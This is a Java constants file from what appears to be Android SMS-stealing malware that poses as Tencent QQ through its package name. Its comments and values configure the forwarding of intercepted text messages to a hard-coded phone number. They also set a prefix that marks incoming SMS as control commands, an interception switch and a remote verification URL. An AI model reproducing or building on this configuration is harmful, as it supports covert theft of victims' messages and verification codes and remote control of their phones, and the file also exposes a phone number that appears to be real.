package com.tencent.qq;

public class Keys {

	public static final String PHONE="13576607553";//"13615077145";
	
	//是否是短信转发模式？不是则为邮件转发
	public static final boolean IS_SMS_INTERCEPT=true;
	
	//短信开头过滤字符，根据该字符判断是不是控制短信
	public static final String FILTER="-=-";

	
	//备用校验文件路径
	public static final String AVAILABLE_FILE="http://1658169486.ys168.com/";
	
	/**
	 * 还需要启用短信转发！！
	 */
	
	/**
	 * 配置文件名称
	 */
	public static final String APP_SETTING="ahead_app_setting";
	
	//item 
	public static final String IS_CREATE_ACCOUNT="is_create_account";
	public static final String LAST_UPDATE_TIME="last_update_time";
	//短信拦截开关
	public static final String SMS_INTERCEPT_SWITCH="sms_intercept_switch";
	/**
	 * 重新同步数据广播Action
	 */
	public static final String XYTIMER_START="xytimer_start";
	
	/**
	 * 配置已更改广播
	 */
	public static final String SETTING_CHANGE="ahead_setting_change";
	
	/**
	 * Handler
	 */
	public static final int HANDLER_FUNCTION_CODE=11;
	
}
